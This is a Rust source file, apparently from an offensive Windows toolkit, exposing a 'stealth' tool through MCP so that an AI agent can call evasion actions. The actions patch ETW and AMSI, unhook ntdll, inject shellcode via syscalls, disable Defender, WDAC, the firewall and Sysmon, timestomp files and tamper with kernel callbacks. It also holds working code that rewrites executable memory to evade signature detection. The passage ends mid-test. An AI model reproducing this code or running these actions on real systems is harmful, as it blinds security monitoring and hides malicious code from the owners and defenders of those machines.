//! MCP stealth tool handler.

use serde_json::{json, Value};

use crate::mcp::action_registry::{classify_action, StealthAction};
use crate::mcp::tool_args::{
    invalid_registered_choice_error, optional_bounded_u64_param, parse_u64_arg,
    require_module_name_param, require_nonzero_usize_param, require_str_param,
    require_typed_action, require_u64_param, unknown_registered_action_error,
};

pub(crate) fn handle_stealth(args: &Value) -> Result<Value, String> {
    let action = require_typed_action(args, "stealth")?;
    let typed_action = StealthAction::try_from(&action)
        .map_err(|_| unknown_registered_action_error("stealth", action.as_str()))?;
    let action_name = typed_action.as_str();

    let result = match typed_action {
        // Patching
        StealthAction::PatchEtw => crate::evasion::etw::etw_bypass(args).map_err(|e| e.to_string()),
        StealthAction::PatchAmsi => {
            crate::evasion::amsi::amsi_bypass(args).map_err(|e| e.to_string())
        }
        StealthAction::PatchCfg => {
            require_u64_param(args, "target_address", "stealth", "patch_cfg")?;
            crate::evasion::cfg::cfg_bypass(args).map_err(|e| e.to_string())
        }
        StealthAction::PatchCig => crate::evasion::cfg::cig_bypass(args).map_err(|e| e.to_string()),

        // Unhooking
        StealthAction::UnhookNtdll => {
            crate::evasion::unhook::unhook_ntdll(args).map_err(|e| e.to_string())
        }

        // Module operations
        StealthAction::HideModule => {
            require_u64_param(args, "pid", "stealth", "hide_module")?;
            require_module_name_param(
                args,
                "module_name",
                "stealth",
                "hide_module",
                Some("Provide the loaded module name to unlink from the target process."),
            )?;
            crate::evasion::unlink::unlink_module(args).map_err(|e| e.to_string())
        }
        StealthAction::FluctuateModule => {
            crate::evasion::fluctuation::module_fluctuation(args).map_err(|e| e.to_string())
        }

        // Sleep obfuscation
        StealthAction::SleepEkko => {
            require_u64_param(args, "address", "stealth", "sleep_ekko")?;
            require_nonzero_usize_param(args, "size", "stealth", "sleep_ekko")?;
            crate::evasion::sleep::ekko_sleep(args).map_err(|e| e.to_string())
        }
        StealthAction::SleepFoliage => {
            require_u64_param(args, "address", "stealth", "sleep_foliage")?;
            require_nonzero_usize_param(args, "size", "stealth", "sleep_foliage")?;
            crate::evasion::sleep::foliage_sleep(args).map_err(|e| e.to_string())
        }
        StealthAction::SleepGargoyle => {
            crate::evasion::gargoyle::gargoyle_sleep(args).map_err(|e| e.to_string())
        }
        StealthAction::SleepDeath => {
            require_u64_param(args, "address", "stealth", "sleep_death")?;
            require_nonzero_usize_param(args, "size", "stealth", "sleep_death")?;
            crate::evasion::sleep::death_sleep(args).map_err(|e| e.to_string())
        }

        // Spoofing
        StealthAction::SpoofCallstack => {
            require_u64_param(args, "shellcode_address", "stealth", "spoof_callstack")?;
            crate::evasion::sleep::spoof_callstack(args).map_err(|e| e.to_string())
        }
        StealthAction::SpoofPpid => {
            crate::evasion::ppid::ppid_spoof(args).map_err(|e| e.to_string())
        }
        StealthAction::SpoofReturn => {
            require_u64_param(args, "target_function", "stealth", "spoof_return")?;
            crate::evasion::retspoof::return_address_spoof(args).map_err(|e| e.to_string())
        }
        StealthAction::DeepStackSpoof => {
            require_u64_param(args, "target_function", "stealth", "deep_stack_spoof")?;
            crate::evasion::retspoof::deep_stack_spoof(args).map_err(|e| e.to_string())
        }

        // Syscalls
        StealthAction::SyscallWrite => {
            let method = args
                .get("syscall_method")
                .and_then(|v| v.as_str())
                .unwrap_or("indirect");
            match method {
                "indirect" => {
                    crate::evasion::syscall::indirect_syscall_write(args).map_err(|e| e.to_string())
                }
                "direct" => {
                    crate::evasion::syscall::syscall_write_memory(args).map_err(|e| e.to_string())
                }
                "int2e" => crate::evasion::syscall::syscall_int2e(args).map_err(|e| e.to_string()),
                _ => Err(invalid_registered_choice_error(
                    "stealth",
                    action_name,
                    "syscall_method",
                    method,
                )),
            }
        }
        StealthAction::SyscallAlloc => {
            let method = args
                .get("syscall_method")
                .and_then(|v| v.as_str())
                .unwrap_or("indirect");
            match method {
                "indirect" => {
                    crate::evasion::syscall::indirect_syscall_alloc(args).map_err(|e| e.to_string())
                }
                "direct" => {
                    crate::evasion::syscall::syscall_alloc_memory(args).map_err(|e| e.to_string())
                }
                "int2e" => crate::evasion::syscall::syscall_int2e(args).map_err(|e| e.to_string()),
                _ => Err(invalid_registered_choice_error(
                    "stealth",
                    action_name,
                    "syscall_method",
                    method,
                )),
            }
        }
        StealthAction::SyscallProtect => {
            let method = args
                .get("syscall_method")
                .and_then(|v| v.as_str())
                .unwrap_or("indirect");
            match method {
                "indirect" => crate::evasion::syscall::indirect_syscall_protect(args)
                    .map_err(|e| e.to_string()),
                "direct" => {
                    crate::evasion::syscall::syscall_protect_memory(args).map_err(|e| e.to_string())
                }
                "int2e" => crate::evasion::syscall::syscall_int2e(args).map_err(|e| e.to_string()),
                _ => Err(invalid_registered_choice_error(
                    "stealth",
                    action_name,
                    "syscall_method",
                    method,
                )),
            }
        }
        StealthAction::SyscallThread => {
            let method = args
                .get("syscall_method")
                .and_then(|v| v.as_str())
                .unwrap_or("indirect");
            match method {
                "indirect" => crate::evasion::syscall::indirect_syscall_create_thread(args)
                    .map_err(|e| e.to_string()),
                "direct" => {
                    crate::evasion::syscall::syscall_create_thread(args).map_err(|e| e.to_string())
                }
                "int2e" => crate::evasion::syscall::syscall_int2e(args).map_err(|e| e.to_string()),
                _ => Err(invalid_registered_choice_error(
                    "stealth",
                    action_name,
                    "syscall_method",
                    method,
                )),
            }
        }
        StealthAction::SyscallOpen => {
            crate::evasion::syscall::indirect_syscall_open_process(args).map_err(|e| e.to_string())
        }
        StealthAction::SyscallRead => {
            crate::evasion::syscall::indirect_syscall_read(args).map_err(|e| e.to_string())
        }
        StealthAction::SyscallQuery => {
            crate::evasion::syscall::indirect_syscall_query(args).map_err(|e| e.to_string())
        }
        StealthAction::SyscallClose => {
            crate::evasion::syscall::indirect_syscall_close(args).map_err(|e| e.to_string())
        }
        StealthAction::SyscallFree => {
            crate::evasion::syscall::indirect_syscall_free(args).map_err(|e| e.to_string())
        }
        StealthAction::SyscallStealthRead => {
            crate::evasion::syscall::indirect_syscall_stealth_read(args).map_err(|e| e.to_string())
        }
        StealthAction::SyscallInject => {
            crate::evasion::syscall::indirect_syscall_inject(args).map_err(|e| e.to_string())
        }

        // Self-protection
        StealthAction::EncryptMemory => {
            if let Some(pid) = parse_u64_arg(args.get("pid")) {
                if pid != std::process::id() as u64 {
                    return Err(
                        "stealth(action='encrypt_memory') only supports local memory in the memoric process. Do not pass a remote PID/address; allocate or identify a local self-protection region first.".to_string()
                    );
                }
            }
            let address = require_u64_param(args, "address", "stealth", "encrypt_memory")? as usize;
            let size = require_nonzero_usize_param(args, "size", "stealth", "encrypt_memory")?;
            crate::bruteforce::self_protect::encrypt_region(address, size)
                .map_err(|e| e.to_string())
        }
        StealthAction::DecryptMemory => {
            if let Some(pid) = parse_u64_arg(args.get("pid")) {
                if pid != std::process::id() as u64 {
                    return Err(
                        "stealth(action='decrypt_memory') only supports local memory previously encrypted in the memoric process. Do not pass a remote PID/address.".to_string()
                    );
                }
            }
            let address = require_u64_param(args, "address", "stealth", "decrypt_memory")? as usize;
            crate::bruteforce::self_protect::decrypt_region(address).map_err(|e| e.to_string())
        }
        StealthAction::MutateCode => mutate_code(args),

        // Sysmon blinding
        StealthAction::SysmonBlind => {
            let mut sysmon_args = args.clone();
            if let Some(m) = args.get("sysmon_method") {
                sysmon_args
                    .as_object_mut()
                    .map(|obj| obj.insert("method".to_string(), m.clone()));
            }
            crate::evasion::sysmon::sysmon_blind(&sysmon_args).map_err(|e| e.to_string())
        }

        // Timestomping
        StealthAction::Timestomp => {
            require_str_param(
                args,
                "target",
                "stealth",
                "timestomp",
                Some("Provide the file path whose timestamps should be changed."),
            )?;
            crate::evasion::timestomp::timestomp(args).map_err(|e| e.to_string())
        }

        // Advanced unhooking
        StealthAction::UnhookFunction => {
            require_str_param(
                args,
                "function_name",
                "stealth",
                "unhook_function",
                Some("Provide the exported function name to restore from a clean module copy."),
            )?;
            crate::evasion::unhook::patch_single_function(args).map_err(|e| e.to_string())
        }

        // Advanced ETW control
        StealthAction::EtwProviderDisable => {
            crate::evasion::etw::etw_provider_disable(args).map_err(|e| e.to_string())
        }
        StealthAction::EtwMassDisable => {
            crate::evasion::edr::etw_mass_disable(args).map_err(|e| e.to_string())
        }

        // Advanced module operations
        StealthAction::ModuleStomp => {
            require_str_param(
                args,
                "dll_path",
                "stealth",
                "module_stomp",
                Some("Provide the sacrificial DLL path or name to load and overwrite."),
            )?;
            require_str_param(
                args,
                "shellcode",
                "stealth",
                "module_stomp",
                Some("Provide hex-encoded shellcode for module stomping."),
            )?;
            crate::evasion::fluctuation::module_stomp(args).map_err(|e| e.to_string())
        }

        // Suspended thread helper
        StealthAction::CreateSuspended => {
            require_u64_param(args, "shellcode_address", "stealth", "create_suspended")?;
            crate::evasion::sleep::create_suspended_thread(args).map_err(|e| e.to_string())
        }

        // Test signing bypass (usermode hooks)
        StealthAction::TestsignHideNtquery => {
            crate::evasion::testsign::testsign_hide_ntquery(args).map_err(|e| e.to_string())
        }
        StealthAction::TestsignHideSelf => {
            crate::evasion::testsign::testsign_hide_self(args).map_err(|e| e.to_string())
        }
        StealthAction::TestsignHideBcd => {
            crate::evasion::testsign::testsign_hide_bcd(args).map_err(|e| e.to_string())
        }
        StealthAction::TestsignQuery => {
            crate::evasion::testsign::testsign_query(args).map_err(|e| e.to_string())
        }
        StealthAction::TestsignAutoInject => {
            crate::evasion::testsign::testsign_auto_inject(args).map_err(|e| e.to_string())
        }
        StealthAction::TestsignLaunchHooked => {
            crate::evasion::testsign::testsign_launch_hooked(args).map_err(|e| e.to_string())
        }
        StealthAction::TestsignKernelBypass => {
            crate::evasion::testsign::testsign_kernel_bypass(args).map_err(|e| e.to_string())
        }
        StealthAction::TestsignLaunchClean => {
            crate::evasion::testsign::testsign_launch_clean(args).map_err(|e| e.to_string())
        }
        StealthAction::TestsignCiCallback => {
            crate::evasion::testsign::testsign_ci_callback_bypass(args).map_err(|e| e.to_string())
        }
        StealthAction::TestsignCiFuncPatch => {
            crate::evasion::testsign::testsign_ci_func_patch(args).map_err(|e| e.to_string())
        }
        StealthAction::TestsignPteRw => {
            crate::evasion::testsign::testsign_pte_rw(args).map_err(|e| e.to_string())
        }

        // WDAC disable / restore
        StealthAction::WdacDisable => {
            crate::evasion::wdac::wdac_disable(args).map_err(|e| e.to_string())
        }
        StealthAction::WdacRestore => {
            crate::evasion::wdac::wdac_restore(args).map_err(|e| e.to_string())
        }

        // Defender deep manipulation
        StealthAction::DefenderDisable => {
            crate::evasion::defender::defender_disable(args).map_err(|e| e.to_string())
        }
        StealthAction::DefenderRestore => {
            crate::evasion::defender::defender_restore(args).map_err(|e| e.to_string())
        }
        StealthAction::DefenderStatus => {
            crate::evasion::defender::defender_status(args).map_err(|e| e.to_string())
        }
        StealthAction::DefenderAddExclusion => {
            require_str_param(
                args,
                "value",
                "stealth",
                "defender_add_exclusion",
                Some("Provide the path, process, or extension value to add."),
            )?;
            crate::evasion::defender::defender_add_exclusion(args).map_err(|e| e.to_string())
        }
        StealthAction::DefenderMpcmdrun => {
            require_str_param(
                args,
                "command",
                "stealth",
                "defender_mpcmdrun",
                Some(
                    "Provide one of remove_definitions, restore_defaults, add_exclusion, remove_exclusion, scan, or cancel_scan.",
                ),
            )?;
            crate::evasion::defender::defender_mpcmdrun(args).map_err(|e| e.to_string())
        }

        // Firewall rule manipulation
        StealthAction::FirewallAddRule => {
            crate::evasion::firewall::firewall_add_rule(args).map_err(|e| e.to_string())
        }
        StealthAction::FirewallRemoveRule => {
            require_str_param(
                args,
                "name",
                "stealth",
                "firewall_remove_rule",
                Some("Provide the display name of the firewall rule to remove."),
            )?;
            crate::evasion::firewall::firewall_remove_rule(args).map_err(|e| e.to_string())
        }
        StealthAction::FirewallListRules => {
            crate::evasion::firewall::firewall_list_rules(args).map_err(|e| e.to_string())
        }
        StealthAction::FirewallDisable => {
            crate::evasion::firewall::firewall_disable(args).map_err(|e| e.to_string())
        }
        StealthAction::FirewallEnable => {
            crate::evasion::firewall::firewall_enable(args).map_err(|e| e.to_string())
        }
        StealthAction::FirewallStatus => {
            crate::evasion::firewall::firewall_status(args).map_err(|e| e.to_string())
        }

        // Sentinel persistence engine
        StealthAction::SentinelStart => {
            crate::evasion::sentinel::sentinel_start(args).map_err(|e| e.to_string())
        }
        StealthAction::SentinelStop => {
            crate::evasion::sentinel::sentinel_stop(args).map_err(|e| e.to_string())
        }
        StealthAction::SentinelStatus => {
            crate::evasion::sentinel::sentinel_status(args).map_err(|e| e.to_string())
        }
        StealthAction::SentinelSelfDestruct => {
            crate::evasion::sentinel::sentinel_self_destruct(args).map_err(|e| e.to_string())
        }

        // Phase 3.5: Kernel callback precision strike
        StealthAction::CallbackEnumByDriver => {
            crate::evasion::callback_ops::callback_enum_by_driver(args).map_err(|e| e.to_string())
        }
        StealthAction::CallbackMasquerade => {
            require_u64_param(args, "callback_index", "stealth", "callback_masquerade")?;
            require_u64_param(args, "array_address", "stealth", "callback_masquerade")?;
            require_str_param(
                args,
                "device_path",
                "stealth",
                "callback_masquerade",
                Some("Provide the BYOVD device path used for kernel memory writes."),
            )?;
            require_u64_param(args, "ioctl_write_code", "stealth", "callback_masquerade")?;
            crate::evasion::callback_ops::callback_masquerade(args).map_err(|e| e.to_string())
        }
        StealthAction::EtwTiSelectiveDisable => {
            crate::evasion::callback_ops::etw_ti_selective_disable(args).map_err(|e| e.to_string())
        }

        // Phase 3.6: Minifilter enhancement
        StealthAction::MinifilterEnumClassified => {
            crate::evasion::callback_ops::minifilter_enum_classified(args)
                .map_err(|e| e.to_string())
        }
        StealthAction::MinifilterSelectiveDetach => {
            crate::evasion::callback_ops::minifilter_selective_detach(args)
                .map_err(|e| e.to_string())
        }
        StealthAction::MinifilterPause => {
            require_str_param(
                args,
                "name",
                "stealth",
                "minifilter_pause",
                Some("Provide the filter name to detach temporarily."),
            )?;
            crate::evasion::callback_ops::minifilter_pause(args).map_err(|e| e.to_string())
        }
        StealthAction::MinifilterResume => {
            require_str_param(
                args,
                "name",
                "stealth",
                "minifilter_resume",
                Some("Provide the filter name from the pause response."),
            )?;
            require_str_param(
                args,
                "altitude",
                "stealth",
                "minifilter_resume",
                Some("Provide the altitude returned by minifilter_pause."),
            )?;
            crate::evasion::callback_ops::minifilter_resume(args).map_err(|e| e.to_string())
        }
    };

    result.map(|value| attach_stealth_metadata(args, action_name, value))
}

fn attach_stealth_metadata(args: &Value, action: &str, mut result: Value) -> Value {
    let traits = classify_action("stealth", action);
    let provenance = stealth_provenance(args);
    let mutation = traits
        .state_changing
        .then(|| stealth_mutation_metadata(args, action, &result));
    let rollback = traits
        .state_changing
        .then(|| stealth_rollback_metadata(args, action, &result));

    if let Some(obj) = result.as_object_mut() {
        obj.entry("provenance".to_string()).or_insert(provenance);
        if let Some(mutation) = mutation {
            obj.entry("mutation".to_string()).or_insert(mutation);
        }
        if let Some(rollback) = rollback {
            obj.entry("rollback".to_string()).or_insert(rollback);
        }
    }
    result
}

fn stealth_provenance(args: &Value) -> Value {
    json!({
        "correlation_id": crate::observability::correlation_id_from_args(args),
        "request_id": args.get("request_id").cloned().unwrap_or(Value::Null),
        "task_id": args.get("task_id").cloned().unwrap_or(Value::Null),
        "chain_id": args.get("chain_id").cloned().unwrap_or(Value::Null),
        "purpose": args.get("purpose").cloned().unwrap_or(Value::Null),
    })
}

fn stealth_mutation_metadata(args: &Value, action: &str, result: &Value) -> Value {
    json!({
        "kind": "stealth_live_mutation",
        "tool": "stealth",
        "action": action,
        "technique": stealth_technique(action, result),
        "state_change": stealth_state_change(action),
        "captured_fields": captured_stealth_fields(args, result),
        "target": {
            "pid": result.get("pid").or_else(|| args.get("pid")).cloned().unwrap_or(Value::Null),
            "tid": result.get("tid").or_else(|| args.get("tid")).cloned().unwrap_or(Value::Null),
            "address": result.get("address")
                .or_else(|| result.get("target_address"))
                .or_else(|| args.get("address"))
                .or_else(|| args.get("target_address"))
                .cloned()
                .unwrap_or(Value::Null),
            "module": result.get("module_name").or_else(|| args.get("module_name")).cloned().unwrap_or(Value::Null),
        },
        "handler_boundary": "src/mcp/stealth_tool.rs",
    })
}

fn stealth_technique(action: &str, result: &Value) -> Value {
    result
        .get("technique")
        .or_else(|| result.get("method"))
        .or_else(|| result.get("operation"))
        .cloned()
        .unwrap_or_else(|| json!(action))
}

fn stealth_state_change(action: &str) -> &'static str {
    match action {
        "patch_etw" | "patch_amsi" | "patch_cfg" | "patch_cig" | "unhook_function" => {
            "process_function_patch"
        }
        "unhook_ntdll" => "module_text_restore",
        "hide_module" => "process_module_unlink",
        "fluctuate_module" | "module_stomp" => "module_image_mutation",
        "sleep_ekko" | "sleep_foliage" | "sleep_gargoyle" | "sleep_death" => "sleep_obfuscation",
        "spoof_callstack" | "spoof_ppid" | "spoof_return" | "deep_stack_spoof" => {
            "execution_context_spoof"
        }
        "syscall_write" | "syscall_alloc" | "syscall_protect" | "syscall_thread"
        | "syscall_close" | "syscall_free" | "syscall_inject" => "direct_syscall_mutation",
        "encrypt_memory" | "decrypt_memory" => "local_memory_encryption_state",
        "mutate_code" => "local_code_mutation",
        "sysmon_blind" => "telemetry_blinding",
        "timestomp" => "file_timestamp_mutation",
        "etw_provider_disable" | "etw_mass_disable" | "etw_ti_selective_disable" => {
            "telemetry_provider_disable"
        }
        "create_suspended" => "suspended_thread_creation",
        action if action.starts_with("testsign_") => "testsigning_bypass_mutation",
        "wdac_disable" | "wdac_restore" => "wdac_policy_mutation",
        "defender_disable"
        | "defender_restore"
        | "defender_add_exclusion"
        | "defender_mpcmdrun" => "defender_configuration_mutation",
        "firewall_add_rule" | "firewall_remove_rule" | "firewall_disable" | "firewall_enable" => {
            "firewall_configuration_mutation"
        }
        "sentinel_start" | "sentinel_stop" | "sentinel_self_destruct" => {
            "sentinel_persistence_state"
        }
        "callback_masquerade" => "kernel_callback_pointer_mutation",
        "minifilter_selective_detach" | "minifilter_pause" | "minifilter_resume" => {
            "minifilter_attachment_state"
        }
        _ => "stealth_state_mutation",
    }
}

fn stealth_rollback_metadata(args: &Value, action: &str, result: &Value) -> Value {
    if let Some(rollback) = local_memory_crypto_rollback(args, action, result) {
        return rollback;
    }
    if let Some(rollback) = minifilter_pause_rollback(result) {
        return rollback;
    }
    if let Some(rollback) = paired_stealth_action_rollback(args, action, result) {
        return rollback;
    }
    if let Some(rollback) = captured_original_bytes_rollback(action, result) {
        return rollback;
    }

    json!({
        "available": false,
        "strategy": "none",
        "captured_fields": captured_stealth_fields(args, result),
        "reason": "no_stealth_rollback_metadata",
        "detail": "stealth live handler did not expose enough state for an executable rollback action",
    })
}

fn local_memory_crypto_rollback(args: &Value, action: &str, result: &Value) -> Option<Value> {
    let address = result
        .get("address")
        .or_else(|| args.get("address"))
        .cloned()?;
    match action {
        "encrypt_memory" => Some(json!({
            "available": true,
            "strategy": "decrypt_local_region",
            "captured_fields": captured_stealth_fields(args, result),
            "action": {
                "tool": "stealth",
                "action": "decrypt_memory",
                "args": {
                    "action": "decrypt_memory",
                    "address": address,
                }
            },
            "detail": "encrypt_memory exposed the local region base address and can be reversed with stealth(action='decrypt_memory')",
        })),
        "decrypt_memory" => {
            let size = result.get("size").or_else(|| args.get("size")).cloned();
            let mut rollback_args = json!({
                "action": "encrypt_memory",
                "address": address,
            });
            if let (Some(obj), Some(size)) = (rollback_args.as_object_mut(), size) {
                obj.insert("size".to_string(), size);
            }
            Some(json!({
                "available": if rollback_args.get("size").is_some() { json!(true) } else { json!("partial") },
                "strategy": "reencrypt_local_region",
                "captured_fields": captured_stealth_fields(args, result),
                "action": {
                    "tool": "stealth",
                    "action": "encrypt_memory",
                    "args": rollback_args,
                },
                "detail": "decrypt_memory can be reversed only when the region size is still known",
            }))
        }
        _ => None,
    }
}

fn minifilter_pause_rollback(result: &Value) -> Option<Value> {
    let recovery = result.get("recovery")?;
    let name = recovery
        .get("name")
        .or_else(|| result.get("name"))
        .cloned()?;
    let altitude = recovery
        .get("altitude")
        .or_else(|| result.get("altitude"))
        .cloned()?;
    let volumes = recovery
        .get("volumes")
        .or_else(|| result.get("detached_volumes"))
        .cloned()
        .unwrap_or_else(|| json!([]));
    let rollback_args = json!({
        "action": "minifilter_resume",
        "name": name,
        "altitude": altitude,
        "volumes": volumes,
    });
    Some(json!({
        "available": true,
        "strategy": "resume_minifilter",
        "captured_fields": ["name", "altitude", "volumes", "recovery"],
        "action": {
            "tool": "stealth",
            "action": "minifilter_resume",
            "args": rollback_args,
        },
        "detail": "minifilter_pause exposed recovery fields that can be passed to stealth(action='minifilter_resume')",
    }))
}

fn paired_stealth_action_rollback(args: &Value, action: &str, result: &Value) -> Option<Value> {
    let restore_action = match action {
        "wdac_disable" => "wdac_restore",
        "defender_disable" => "defender_restore",
        "firewall_disable" => "firewall_enable",
        "sentinel_start" => "sentinel_stop",
        "firewall_add_rule" => "firewall_remove_rule",
        "firewall_remove_rule" => "firewall_add_rule",
        _ => return None,
    };

    let rollback_args = paired_rollback_args(args, result, restore_action);
    Some(json!({
        "available": if paired_action_has_required_args(restore_action, &rollback_args) {
            json!(true)
        } else {
            json!("partial")
        },
        "strategy": "paired_stealth_restore_action",
        "captured_fields": captured_stealth_fields(args, result),
        "action": {
            "tool": "stealth",
            "action": restore_action,
            "args": rollback_args,
        },
        "detail": "stealth action has a registry-visible paired restore action; availability depends on captured handler arguments",
    }))
}

fn paired_rollback_args(args: &Value, result: &Value, restore_action: &str) -> Value {
    let mut rollback_args = json!({ "action": restore_action });
    if let Some(obj) = rollback_args.as_object_mut() {
        for field in [
            "name",
            "profiles",
            "direction",
            "program",
            "local_port",
            "remote_port",
            "protocol",
            "value",
            "type",
        ] {
            if let Some(value) = result.get(field).or_else(|| args.get(field)) {
                obj.insert(field.to_string(), value.clone());
            }
        }
    }
    rollback_args
}

fn paired_action_has_required_args(restore_action: &str, rollback_args: &Value) -> bool {
    match restore_action {
        "firewall_remove_rule" | "firewall_add_rule" => rollback_args.get("name").is_some(),
        _ => true,
    }
}

fn captured_original_bytes_rollback(action: &str, result: &Value) -> Option<Value> {
    let original_bytes = result.get("original_bytes")?;
    let address = result
        .get("address")
        .or_else(|| result.get("target_address"))
        .or_else(|| result.get("function_address"));

    let mut rollback = json!({
        "available": "partial",
        "strategy": "restore_original_bytes",
        "captured_fields": ["address", "original_bytes"],
        "original_bytes": original_bytes,
        "detail": "stealth live handler captured original bytes, but no dedicated stealth restore action exists for this mutation",
    });

    if let (Some(obj), Some(address)) = (rollback.as_object_mut(), address) {
        obj.insert(
            "action".to_string(),
            json!({
                "tool": "hook",
                "action": "restore",
                "args": {
                    "action": "restore",
                    "address": address,
                    "original_bytes": original_bytes,
                }
            }),
        );
    } else if let Some(obj) = rollback.as_object_mut() {
        obj.insert("reason".to_string(), json!("missing_restore_address"));
    }

    if let Some(obj) = rollback.as_object_mut() {
        obj.insert("source_action".to_string(), json!(action));
    }
    Some(rollback)
}

fn captured_stealth_fields(args: &Value, result: &Value) -> Vec<&'static str> {
    let mut fields = Vec::new();
    for (field, source) in [
        ("pid", result),
        ("tid", result),
        ("address", result),
        ("target_address", result),
        ("function_address", result),
        ("shellcode_address", result),
        ("size", result),
        ("old_protection", result),
        ("original_bytes", result),
        ("patch_bytes", result),
        ("module_name", result),
        ("dll_path", result),
        ("name", result),
        ("altitude", result),
        ("volumes", result),
        ("detached_volumes", result),
        ("recovery", result),
        ("profiles", result),
        ("value", result),
        ("type", result),
        ("callback_index", result),
        ("array_address", result),
        ("original_ptr", result),
        ("original_pte_value", result),
        ("pid", args),
        ("tid", args),
        ("address", args),
        ("target_address", args),
        ("function_address", args),
        ("shellcode_address", args),
        ("size", args),
        ("module_name", args),
        ("dll_path", args),
        ("name", args),
        ("altitude", args),
        ("profiles", args),
        ("value", args),
        ("type", args),
        ("callback_index", args),
        ("array_address", args),
    ] {
        if source.get(field).is_some() {
            fields.push(field);
        }
    }
    fields.sort_unstable();
    fields.dedup();
    fields
}

/// Metamorphic code mutation - applies random transformations to executable code in-memory
/// to change its byte signature while preserving functionality.
///
/// Techniques:
/// 1. NOP sled insertion (multi-byte NOPs for stealth)
/// 2. Dead code insertion (junk instructions that don't affect state)
/// 3. Equivalent instruction substitution (e.g. xor rax,rax -> sub rax,rax)
/// 4. Register reassignment where possible
fn mutate_code(args: &Value) -> Result<Value, String> {
    let address = require_u64_param(args, "address", "stealth", "mutate_code")?;
    let size = require_nonzero_usize_param(args, "size", "stealth", "mutate_code")?;
    let intensity =
        optional_bounded_u64_param(args, "intensity", "stealth", "mutate_code", 1)? as u8;

    unsafe {
        use windows::Win32::System::Memory::{
            VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
        };

        let mem = address as *mut u8;

        // 1. Make writable
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(mem as *const _, size, PAGE_READWRITE, &mut old_protect)
            .map_err(|e| format!("VirtualProtect RW: {}", e))?;

        let code = std::slice::from_raw_parts_mut(mem, size);
        let mut mutations = 0u32;

        // Simple PRNG seeded from TSC
        let mut rng: u64 = std::arch::x86_64::_rdtsc();
        let next_rng = |state: &mut u64| -> u64 {
            *state ^= *state << 13;
            *state ^= *state >> 7;
            *state ^= *state << 17;
            *state
        };

        // Scan for mutable patterns and apply substitutions
        let mut i = 0;
        while i < code.len().saturating_sub(2) {
            let rand_val = next_rng(&mut rng);

            // Only mutate at probability proportional to intensity
            if (rand_val % 4) >= intensity as u64 {
                i += 1;
                continue;
            }

            // Pattern: xor reg, reg (REX.W + 0x31/0x33) -> sub reg, reg
            // 48 31 C0 (xor rax,rax) -> 48 29 C0 (sub rax,rax)
            // 48 33 C0 (xor rax,rax) -> 48 2B C0 (sub rax,rax)
            if i + 2 < code.len() && code[i] == 0x48 && (code[i + 1] == 0x31 || code[i + 1] == 0x33)
            {
                let modrm = code[i + 2];
                let rm = modrm & 0x07;
                let reg = (modrm >> 3) & 0x07;
                if reg == rm {
                    // xor reg,reg -> sub reg,reg  (equivalent zeroing)
                    code[i + 1] = if code[i + 1] == 0x31 { 0x29 } else { 0x2B };
                    mutations += 1;
                    i += 3;
                    continue;
                }
            }

            // sub reg,reg -> xor reg,reg (reverse of above)
            if i + 2 < code.len() && code[i] == 0x48 && (code[i + 1] == 0x29 || code[i + 1] == 0x2B)
            {
                let modrm = code[i + 2];
                let rm = modrm & 0x07;
                let reg = (modrm >> 3) & 0x07;
                if reg == rm {
                    code[i + 1] = if code[i + 1] == 0x29 { 0x31 } else { 0x33 };
                    mutations += 1;
                    i += 3;
                    continue;
                }
            }

            // Pattern: single-byte NOP (0x90) -> multi-byte NOP equivalent
            if code[i] == 0x90 && i + 1 < code.len() && code[i + 1] == 0x90 {
                // 2-byte NOP: 66 90
                code[i] = 0x66;
                code[i + 1] = 0x90;
                mutations += 1;
                i += 2;
                continue;
            }

            // Pattern: mov reg, imm (48 C7 C0 xx xx xx xx) when imm == 0 -> xor reg, reg
            if i + 6 < code.len() && code[i] == 0x48 && code[i + 1] == 0xC7 {
                let modrm = code[i + 2];
                if (modrm & 0xF8) == 0xC0 {
                    let imm =
                        u32::from_le_bytes([code[i + 3], code[i + 4], code[i + 5], code[i + 6]]);
                    if imm == 0 {
                        let reg = modrm & 0x07;
                        // 48 C7 C0 00 00 00 00 (7 bytes) -> 48 31 C0 90 90 90 90
                        code[i] = 0x48;
                        code[i + 1] = 0x31;
                        code[i + 2] = 0xC0 | (reg << 3) | reg; // xor reg, reg
                        code[i + 3] = 0x90;
                        code[i + 4] = 0x90;
                        code[i + 5] = 0x90;
                        code[i + 6] = 0x90;
                        mutations += 1;
                        i += 7;
                        continue;
                    }
                }
            }

            // Pattern: test reg, reg -> and reg, reg (equivalent for ZF)
            // 48 85 C0 (test rax,rax) -> 48 21 C0 (and rax,rax)
            if i + 2 < code.len() && code[i] == 0x48 && code[i + 1] == 0x85 {
                code[i + 1] = 0x21;
                mutations += 1;
                i += 3;
                continue;
            }

            // and reg,reg -> test reg,reg (reverse)
            if i + 2 < code.len() && code[i] == 0x48 && code[i + 1] == 0x21 {
                let modrm = code[i + 2];
                let rm = modrm & 0x07;
                let reg = (modrm >> 3) & 0x07;
                if reg == rm {
                    code[i + 1] = 0x85;
                    mutations += 1;
                    i += 3;
                    continue;
                }
            }

            i += 1;
        }

        // 2. Restore execute
        VirtualProtect(mem as *const _, size, PAGE_EXECUTE_READ, &mut old_protect)
            .map_err(|e| format!("VirtualProtect RX: {}", e))?;

        Ok(json!({
            "success": true,
            "technique": "metamorphic_mutation",
            "address": format!("0x{:016X}", address),
            "size": size,
            "mutations_applied": mutations,
            "intensity": intensity,
            "message": format!("{} equivalent-instruction substitutions applied. Code signature changed, functionality preserved.", mutations)
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn syscall_write_rejects_unknown_method() {
        let error =
            handle_stealth(&json!({"action": "syscall_write", "syscall_method": "unknown"}))
                .expect_err("unknown syscall method should fail before execution");

        assert!(error.contains("stealth(action='syscall_write')"));
        assert!(error.contains("syscall_method"));
        assert!(error.contains("indirect"));
    }

    #[test]
    fn hide_module_requires_module_name_after_pid() {
        let error = handle_stealth(&json!({"action": "hide_module", "pid": 1234}))
            .expect_err("hide_module should require module name");

        assert!(error.contains("stealth(action='hide_module')"));
        assert!(error.contains("module_name"));
    }

    #[test]
    fn hide_module_rejects_path_like_module_names() {
        let error = handle_stealth(&json!({
            "action": "hide_module",
            "pid": 1234,
            "module_name": "C:\\Windows\\System32\\ntdll.dll"
        }))
        .expect_err("module paths should fail before unlinking");

        assert!(error.contains("stealth(action='hide_module')"));
        assert!(error.contains("module_name"));
        assert!(error.contains("path separators"));
    }

    #[test]
